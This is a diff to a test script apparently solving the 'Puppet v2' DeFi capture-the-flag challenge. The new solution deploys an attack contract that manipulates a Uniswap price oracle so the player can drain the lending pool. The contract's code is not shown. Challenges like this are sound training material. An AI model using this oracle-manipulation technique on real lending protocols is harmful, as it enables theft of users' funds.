@@ -82,20 +82,19 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE **/
+        /** CODE YOUR SOLUTION HERE */
+        // Approve exchange so transferFrom() works
 
-        //change your monex into weth
-        weth.connect(player).deposit({value: 20n * 10n ** 18n});
+        //Get our WETH
+        await weth.connect(player).deposit({value: 19n * 10n ** 18n});
+
+        let AttackPuppet = await (await ethers.getContractFactory('AttackV2Puppet', player)).deploy(lendingPool.address, uniswapRouter.address, token.address, weth.address, uniswapExchange.address, uniswapFactory.address);
+
+        await weth.connect(player).approve(AttackPuppet.address, PLAYER_INITIAL_ETH_BALANCE);
+        await token.connect(player).approve(AttackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);
         
-        //approve uniswap exchange to spend tokens
-        await uniswapExchange.connect(player).approve(uniswapExchange.address, 10000n * 10n ** 18n);
-
-        //Swap tokens for ETH
-        await uniswapExchange.connect(player).swapExactTokensForETH(10000n * 10n ** 18n, 1, [token, weth], player, (await ethers.provider.getBlock('latest')).timestamp + 42069);
-
-        //Deposit ETH into pool
-        console.log(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
-        
+        // Swap tokens for ETH /reduce price oracle
+        await AttackPuppet.attack();
     });
 
     after(async function () {
